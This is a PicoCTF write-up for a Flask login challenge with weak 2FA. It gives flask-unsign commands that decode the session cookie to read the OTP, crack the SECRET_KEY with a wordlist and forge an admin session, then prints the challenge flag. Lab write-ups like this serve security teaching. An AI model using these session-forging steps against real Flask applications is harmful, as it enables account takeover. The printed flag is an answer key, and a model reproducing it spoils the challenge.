# PicoCTF Writeup – Weak 2FA & Flask Session Exploit

## Challenge Overview
The application is a Flask-based login system with optional 2FA. A leaked database and session cookie allow exploitation.

---

## Key Vulnerabilities

### 1. Weak Password Storage
- Passwords stored as SHA-256 without salt
- Vulnerable to dictionary attacks (rockyou.txt)

### 2. Weak 2FA Implementation
- OTP is only 4 digits (1000–9999)
- No rate limiting
- Stored in client-side session

### 3. Flask Session Weakness
- Flask uses client-side signed cookies
- If SECRET_KEY is weak, sessions can be forged

---

## Exploitation Steps

### Step 1: Decode Session Cookie

```bash
flask-unsign --decode --cookie "<cookie>"
```

Decoded output:
```python
{'otp_secret': 'XXXX', 'otp_timestamp': XXXXXXXX, 'username': 'admin', 'logged': 'false'}
```

---

### Step 2: Extract OTP
The OTP is directly visible in the decoded cookie.

Example:
```
OTP = 7421
```

---

### Step 3: Login as Admin
1. Login with admin credentials
2. Enter OTP from decoded cookie

---

### Step 4: Retrieve Flag
After successful login:
- Visit `/`
- Flag is displayed

---

## Alternative Attack (Bypass 2FA)

### Crack SECRET_KEY
```bash
flask-unsign --unsign --cookie "<cookie>" --wordlist rockyou.txt
```

### Forge Admin Session
```bash
flask-unsign --sign   --cookie "{'username':'admin','logged':'true'}"   --secret "<SECRET_KEY>"
```

Replace cookie in browser → access flag directly.

---

## Lessons Learned
- 2FA must use secure randomness and rate limiting
- Never store secrets client-side
- Always salt password hashes
- Use strong Flask SECRET_KEY

---

## Final Flag
```
picoCTF{n0_r4t3_n0_4uth_9617ed73}
```
